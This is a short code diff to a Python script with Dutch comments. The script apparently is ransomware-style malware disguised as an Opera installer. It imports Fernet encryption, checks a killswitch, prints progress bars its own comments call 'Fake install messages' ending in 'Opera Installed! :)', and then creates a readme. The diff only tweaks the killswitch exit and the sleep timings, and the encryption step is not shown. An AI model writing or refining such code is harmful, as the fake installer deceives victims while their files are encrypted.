@@ -2,6 +2,7 @@ import os
 from cryptography.fernet import Fernet
 from tqdm import tqdm
 import time
+import sys
 
 #Killswitch Functie
 try:
@@ -11,8 +12,7 @@ except:
    Killswitch_Bool = False
 
 if Killswitch_Bool==True:
-    print("KillSwitch actief.")
-    exit()
+    sys.exit("KillSwitch actief.")
 else:
     pass
 
@@ -63,11 +63,11 @@ else:
 #Fake install messages.
 if check_1 == 1:
    for i in tqdm(range(256)):
-      time.sleep(0.10)
+      time.sleep(0.05)
    print("Opera Uninstalled! :(")
 elif check_1 == 0:
    for i in tqdm(range(256)):
-      time.sleep(0.10)
+      time.sleep(0.05)
    print("Opera Installed! :)")
 
 #Readme aanmaken.
